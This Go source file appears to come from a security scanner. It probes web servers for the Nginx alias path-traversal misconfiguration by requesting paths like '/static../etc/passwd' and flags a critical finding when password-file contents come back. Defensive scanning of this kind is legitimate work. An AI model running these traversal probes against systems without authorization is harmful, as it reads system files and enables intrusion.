package scanner

import (
	"context"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/temren/pkg/httpengine"
)

// NginxAliasTraversalScanner exploits the classic "location /foo  alias /bar/" pattern
// where the trailing slash on the alias is missing. Requesting /foo../etc/passwd
// resolves to /bar/../etc/passwd.
type NginxAliasTraversalScanner struct{}

func NewNginxAliasTraversalScanner() *NginxAliasTraversalScanner {
	return &NginxAliasTraversalScanner{}
}

func (s *NginxAliasTraversalScanner) Name() string { return "Nginx Alias Traversal" }

func (s *NginxAliasTraversalScanner) Scan(ctx context.Context, target string, client *httpengine.Client) ([]Finding, error) {
	target = strings.TrimRight(target, "/")
	// Candidates: /static, /images, /assets, /files, /uploads.
	candidates := []string{"static", "images", "assets", "files", "uploads", "img", "downloads"}
	var findings []Finding
	for _, c := range candidates {
		probe := target + "/" + c + "../etc/passwd"
		req, _ := http.NewRequestWithContext(ctx, http.MethodGet, probe, nil)
		resp, err := client.Do(ctx, req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		resp.Body.Close()
		if strings.Contains(string(body), "root:") {
			findings = append(findings, Finding{
				URL: probe, Title: "Nginx Alias Traversal",
				Description: "Missing trailing slash on Nginx \"alias\" directive allowed traversal out of the static-serve directory. Patch the config and add ^~ matchers.",
				Severity: SeverityCritical, Confidence: ConfidenceHigh, Scanner: s.Name(),
				Evidence: "/etc/passwd contents reflected",
				Timestamp: time.Now(), OWASPCategory: "A01:2021-Broken Access Control", CVSSScore: 9.8,
			})
			return findings, nil
		}
	}
	return findings, nil
}
